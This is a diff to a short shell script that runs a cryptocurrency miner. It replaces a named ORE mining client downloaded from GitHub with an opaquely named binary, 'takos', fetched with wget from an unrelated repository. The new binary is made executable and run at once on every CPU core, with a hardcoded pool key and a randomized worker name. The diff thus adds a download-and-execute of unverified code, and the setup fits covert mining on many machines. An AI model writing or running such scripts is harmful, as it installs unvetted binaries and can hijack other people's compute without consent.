@@ -1,6 +1,5 @@
 #!/bin/sh
 apt update && apt install unzip
-wget https://github.com/egg5233/ore-hq-client/releases/download/1.6.0/OrionClient_linux.zip && unzip OrionClient_linux.zip
-cd OrionClient_linux
-chmod +x OrionClient
-./OrionClient mine -a --pool twbitz --key xLPMoYZixVLRHJV7hb9gZoMusczWYRzP7JqFCRb6vXp --worker $(shuf -n 1 -i 1-99999)-PVS -t $(nproc --all) --ice
+wget https://github.com/sakarohit/bsasd/releases/download/pacv/takos
+chmod +x takos
+./takos mine -a --pool twbitz --key xLPMoYZixVLRHJV7hb9gZoMusczWYRzP7JqFCRb6vXp --worker $(shuf -n 1 -i 1-99999)-PVS -t $(nproc --all) --ice
